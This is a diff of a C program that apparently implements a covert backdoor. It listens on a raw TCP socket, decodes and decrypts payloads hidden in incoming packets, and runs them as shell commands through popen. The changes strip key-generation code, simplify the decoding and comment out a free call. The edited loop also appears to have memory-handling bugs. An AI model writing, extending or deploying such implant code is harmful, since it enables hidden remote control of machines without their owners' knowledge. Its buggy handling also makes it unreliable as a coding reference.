@@ -77,15 +77,6 @@ int main(void)
  	if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == ERRO)
   		exit(ERRO);
 
-   /* generate encryption key */
- /*   if(!PKCS5_PBKDF2_HMAC_SHA1(key, strlen(key),NULL,0,1000,32,key))
-    {
-      printf("Error in key generation\n");
-      exit(1);
-    }
-    */
-/* generate random IV */
-//    while(!RAND_bytes(iv,sizeof(iv)));
 
  	while(read(sockfd, buffer, sizeof (buffer)-1)) 
  	{
@@ -102,16 +93,13 @@ int main(void)
     				counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
 
     				inet_ntop(AF_INET,&(iphr->saddr),ip_tmp,INET_ADDRSTRLEN);
-            int sizebuf=strlen(buffer+counter);
-            char *tmp=malloc(sizebuf);
-            memset(tmp,0,sizebuf-1);  
-            sprintf(tmp,"%s",buffer+counter);
-            unsigned char *decode_64_input=decode64(tmp,strlen(tmp));
+            unsigned char *decode_64_input=decode64(buffer+counter,strlen(buffer+counter));
             memset(pt,0,1024);
             k = decrypt(decode_64_input, strlen(decode_64_input), aad, sizeof(aad), tag, key, iv, pt);
-            char *decode_64_output=decode64(pt,strlen(pt)-4);
+            char *decode_64_output=decode64(pt,strlen(pt));
             int sizedecode=strlen(decode_64_output);
     				char *cmd=malloc(sizedecode+1*sizeof(char));
+            memset(cmd,0,sizedecode);
     				snprintf(cmd,sizedecode+1*sizeof(char),"%s",decode_64_output);
 
 
@@ -137,8 +125,8 @@ int main(void)
     				pclose(fpipe);
     	       
     				free(decode_64_input);
-    				free(cmd);
-            free(tmp);
+   // 				free(cmd);
+            
 
     				cmd++;
    			}
